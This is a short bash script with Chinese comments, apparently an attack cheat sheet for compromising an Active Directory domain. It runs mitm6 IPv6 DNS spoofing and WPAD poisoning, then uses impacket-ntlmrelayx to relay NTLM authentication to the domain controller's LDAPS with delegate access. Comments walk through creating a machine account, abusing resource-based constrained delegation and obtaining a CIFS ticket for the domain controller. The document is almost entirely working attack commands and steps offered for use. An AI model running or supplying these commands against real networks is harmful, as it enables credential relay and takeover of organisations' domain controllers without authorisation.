#!/bin/bash
# mitm6 IPv6 DNS 欺骗 + NTLM 中继攻击

DOMAIN="corp.local"
DC_IP="192.168.1.10"
INTERFACE="eth0"

echo "[*] 第一步：启动 mitm6（IPv6 DNS 欺骗）"
echo "    在终端1执行："
echo "    mitm6 -d ${DOMAIN} -i ${INTERFACE}"
echo ""

echo "[*] 第二步：启动 ntlmrelayx（LDAP 中继）"
echo "    在终端2执行："
impacket-ntlmrelayx -6 \
    -t ldaps://${DC_IP} \
    -wh attacker-wpad \
    --delegate-access \
    --no-dump

# 攻击流程：
# 1. mitm6 伪造 IPv6 DNS 服务器，将 WPAD 解析到攻击机
# 2. 目标机器通过 WPAD 自动代理配置，向攻击机发起 NTLM 认证
# 3. ntlmrelayx 将认证中继到域控 LDAP
# 4. 在域控创建计算机账户，配置基于资源的约束委派（RBCD）
# 5. 利用 RBCD 获取域控 CIFS 服务票据，实现域控访问
